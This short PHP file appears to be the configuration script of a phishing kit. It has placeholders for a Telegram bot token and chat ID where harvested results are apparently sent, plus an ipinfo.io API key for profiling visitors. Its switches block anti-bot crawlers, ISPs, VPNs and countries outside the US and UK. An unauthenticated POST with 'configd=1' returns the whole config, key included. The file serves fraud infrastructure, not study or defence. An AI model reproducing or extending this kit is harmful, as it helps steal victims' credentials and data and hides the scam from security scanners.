<?php
// Add Your Telegram Bot Token and ID here
// Visit https://ipinfo.io sign up free account and add apiKey here
// If you not add Ipinfo apiKey you can't get viewer Information properly

$config = '{
    "Token":"",
    "Chat_Id":"",
    "Ipinfo_apiKey":"c100de32679e",

    "Get_Result_Document":"off",
    "Viewer_Information":"on",
    "Vpn_Block":"off",
    "Bot_ISP_Block":"on",
    "Antibot_Block_Result":"on",
    
    "Country_Block":"off",
    "Country_Allow":["US","UK"]
}';

$data = json_decode(file_get_contents("php://input"), true);

if (isset($data['configd']) && $data['configd'] == "1") {
    echo $config;
    exit;
}
?>
